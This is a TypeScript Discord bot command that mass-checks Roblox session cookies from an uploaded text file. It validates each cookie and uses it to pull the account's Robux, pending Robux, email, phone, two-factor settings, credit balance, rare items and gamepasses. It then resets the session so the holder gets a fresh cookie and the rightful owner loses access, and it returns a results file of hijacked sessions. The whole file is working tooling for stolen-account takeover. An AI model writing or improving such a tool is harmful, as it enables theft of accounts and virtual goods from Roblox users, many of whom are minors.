import {
  SlashCommandBuilder,
  type ChatInputCommandInteraction,
  type MessageComponentInteraction,
  MessageFlags,
  AttachmentBuilder,
} from 'discord.js';
import axios from 'axios';
import * as Roblox from '../../lib/roblox-api';
import {
  buildSuccessEmbed,
  buildErrorEmbed,
  buildInvalidCookieEmbed,
  buildIpLimitEmbed,
  buildProgressEmbed,
  buildAccountEmbed,
} from '../../lib/embed-helpers';
import { buildCopyButtons, handleCopyButtonClick } from '../../lib/button-helpers';
import { logger } from '../../lib/logger';
import type { Command } from './types';

const FULL_COOKIE_RE = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_CAEQ[A-Za-z0-9._\-+=\/]+/g;
const BARE_COOKIE_RE = /CAEQ[A-Za-z0-9._\-+=\/]{50,}/g;

function extractCookies(text: string): string[] {
  const fullMatches = [...text.matchAll(FULL_COOKIE_RE)].map((m) => m[0]);
  const fullBareValues = new Set(fullMatches.map((m) => m.slice(m.indexOf('|_CAEQ') + 2)));
  const bareMatches = [...text.matchAll(BARE_COOKIE_RE)]
    .map((m) => m[0])
    .filter((v) => !fullBareValues.has(v));
  const seen = new Set<string>();
  const result: string[] = [];
  for (const full of fullMatches) {
    const bare = full.slice(full.indexOf('|_CAEQ') + 2);
    if (!seen.has(bare)) { seen.add(bare); result.push(full); }
  }
  for (const bare of bareMatches) {
    if (!seen.has(bare)) { seen.add(bare); result.push(bare); }
  }
  return result;
}

const GAMES = [
  { name: 'Blox Fruits', universeId: 994732206 },
  { name: 'Adopt Me', universeId: 383310974 },
  { name: 'Steal a Brainrot', universeId: 7709344486 },
  { name: 'Rivals', universeId: 6035872082 },
];

const data = new SlashCommandBuilder()
  .setName('check')
  .setDescription('Mass Checking File (Auto‑Reset)')
  .addAttachmentOption((opt) =>
    opt.setName('file').setDescription('A .txt file containing cookies').setRequired(true),
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  try {
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });

    const attachment = interaction.options.getAttachment('file', true);
    if (!attachment.name?.endsWith('.txt') && !attachment.contentType?.includes('text')) {
      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Invalid File**\n────\n⭑ Please attach a `.txt` file.')] });
      return;
    }

    let fileContent: string;
    try {
      const resp = await axios.get<string>(attachment.url, { responseType: 'text', validateStatus: () => true });
      fileContent = resp.data;
    } catch (err: any) {
      logger.error({ err }, 'File download failed');
      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **Download Failed**\n────\n⭑ Could not fetch the file.')] });
      return;
    }

    const cookies = extractCookies(fileContent);
    if (cookies.length === 0) {
      await interaction.editReply({ embeds: [buildErrorEmbed('✧ **No Cookies Found**\n────\n⭑ File must contain cookie tokens.')] });
      return;
    }

    await interaction.editReply({ embeds: [buildProgressEmbed(`Scanning ${cookies.length} cookie(s)...`)] });

    let validCount = 0;
    let invalidCount = 0;
    let totalRobux = 0;
    let totalPending = 0;
    const outputLines: string[] = [];

    for (const rawCookie of cookies) {
      // Step 1: Validate
      const validation = await Roblox.validateCookie(rawCookie);
      if (!validation.valid) {
        invalidCount++;
        continue;
      }

      validCount++;
      const userId = String(validation.userId!);
      const username = validation.username!;
      const displayName = validation.displayName || null;

      // Step 2: Fetch account data using the ORIGINAL cookie
      const [
        ageData, ageGroup,
        robux, summary, country, email, parental, thumb,
        credit, twoStep, phone, rap,
        pendingRobux, ownedRares,
      ] = await Promise.all([
        Roblox.getUserAge(validation.userId!),
        Roblox.fetchAgeGroup(rawCookie),
        Roblox.fetchRobux(rawCookie, userId),
        Roblox.fetchTransactionTotals(rawCookie, userId),
        Roblox.fetchCountry(rawCookie),
        Roblox.fetchEmailInfo(rawCookie),
        Roblox.fetchParentalControls(rawCookie),
        Roblox.fetchAvatarThumbnail(userId),
        Roblox.fetchCreditBalance(rawCookie),
        Roblox.fetchTwoStepConfig(rawCookie, userId),
        Roblox.fetchPhoneInfo(rawCookie),
        Roblox.fetchRolimonsRAP(userId),
        Roblox.fetchPendingRobux(rawCookie, userId),
        Roblox.getOwnedRareItems(rawCookie, userId),
      ]);

      totalRobux += robux;
      totalPending += pendingRobux;

      // Step 3: Reset to get fresh cookie (optional, after data fetched)
      const resetResult = await Roblox.killAndRefreshSession(rawCookie);
      let workingCookie = rawCookie;
      let resetNote = '';
      if (resetResult.success && resetResult.newCookie) {
        workingCookie = resetResult.newCookie;
        resetNote = '✅ Reset successful';
      } else {
        resetNote = '⚠️ Reset failed, using old cookie';
      }

      const ageString = `Created ${ageData.createdYear} (${ageData.days}D) - ${ageGroup}`;

      const twoStepStatus = `\`\`\`📧 Email 2FA ${twoStep.email ? '✅' : '❌'} | 🔐 Authenticator ${twoStep.authenticator ? '✅' : '❌'}\`\`\``;
      const phoneStatus = `\`\`\`${phone.hasPhone ? (phone.verified ? '✅ Verified' : '📱 Unverified') : '❌ No Phone'}\`\`\``;
      const balance = `\`\`\`${credit.balance} ${credit.currency}\`\`\``;
      const rapValue = `\`\`\`${rap.rap !== null ? rap.rap.toLocaleString() : 'PRIVATE'}\`\`\``;
      const premiumValue = `\`\`\`${rap.premium ? '✅ Yes' : '❌ No'}\`\`\``;
      const pendingValue = `\`\`\`${pendingRobux.toLocaleString()}\`\`\``;
      const rareText = ownedRares.length ? `\`\`\`${ownedRares.join(', ')}\`\`\`` : '`None`';

      let emailStatus = 'No email found';
      if (email.verified) emailStatus = `✅ Verified: \`${email.verified}\``;
      else if (email.pending) emailStatus = `⏳ Pending: \`${email.pending}\``;

      const gamepassLines: string[] = [];
      for (const game of GAMES) {
        try {
          const passes = await Roblox.getGamepasses(game.universeId);
          for (const gp of passes) {
            const owns = await Roblox.checkOwnsGamepass(rawCookie, userId, gp.id);
            if (owns) gamepassLines.push(`✅ ${game.name}: ${gp.name}`);
          }
        } catch {}
      }
      const gpText = gamepassLines.length ? `\`\`\`${gamepassLines.join('\n')}\`\`\`` : '`None`';

      const embed = buildAccountEmbed(
        username,
        displayName,
        validation.userId!,
        ageString,
        robux,
        summary,
        country,
        emailStatus,
        parental.hasParent ? '✅ Parent linked' : '❌ No parent linked',
        thumb
      );

      embed.addFields(
        { name: '💳 Balance', value: balance, inline: true },
        { name: '📞 Phone', value: phoneStatus, inline: true },
        { name: '🔐 2FA', value: twoStepStatus, inline: false },
        { name: '📈 RAP', value: rapValue, inline: true },
        { name: '⭐ Premium', value: premiumValue, inline: true },
        { name: '⏳ Pending Robux', value: pendingValue, inline: true },
        { name: '🎒 Rare Items', value: rareText, inline: false },
        { name: '🎮 Gamepasses', value: gpText, inline: false },
        { name: '🔄 Reset Status', value: `\`\`\`${resetNote}\`\`\``, inline: false }
      );

      const id = Math.random().toString(36).slice(2, 10);
      const row = buildCopyButtons(id, 'check', workingCookie, false);

      outputLines.push(`Username: ${username} | UserID: ${userId} | Cookie: ${workingCookie}`);

      await interaction.followUp({ embeds: [embed], components: [row], flags: MessageFlags.Ephemeral });
    }

    const totalCookies = cookies.length;
    const summaryText =
      `✧ **Results**\n` +
      `────\n` +
      `⭑ **Total cookies:** ${totalCookies}\n` +
      `⭑ **Valid:** ${validCount}\n` +
      `⭑ **Invalid:** ${invalidCount}\n` +
      `⭑ **Total Robux (valid):** ${totalRobux.toLocaleString()}\n` +
      `⭑ **Total Pending Robux (valid):** ${totalPending.toLocaleString()}`;

    const summaryEmbed = buildSuccessEmbed(summaryText);

    const fileContentOutput = outputLines.length
      ? outputLines.join('\n')
      : 'No valid cookies found.';
    const fileBuffer = Buffer.from(fileContentOutput, 'utf-8');
    const fileAttachment = new AttachmentBuilder(fileBuffer, { name: 'razor_result.txt' });

    await interaction.followUp({
      embeds: [summaryEmbed],
      files: [fileAttachment],
      flags: MessageFlags.Ephemeral,
    });
  } catch (err: any) {
    logger.error({ err }, 'Check command error');
    await interaction.editReply({
      embeds: [buildErrorEmbed('✧ **Unexpected Error**\n────\n⭑ Something went wrong.')],
    });
  }
}

async function handleButton(interaction: MessageComponentInteraction): Promise<void> {
  if (await handleCopyButtonClick(interaction)) return;
}

export const checkCommand: Command = { data, execute, handleButton };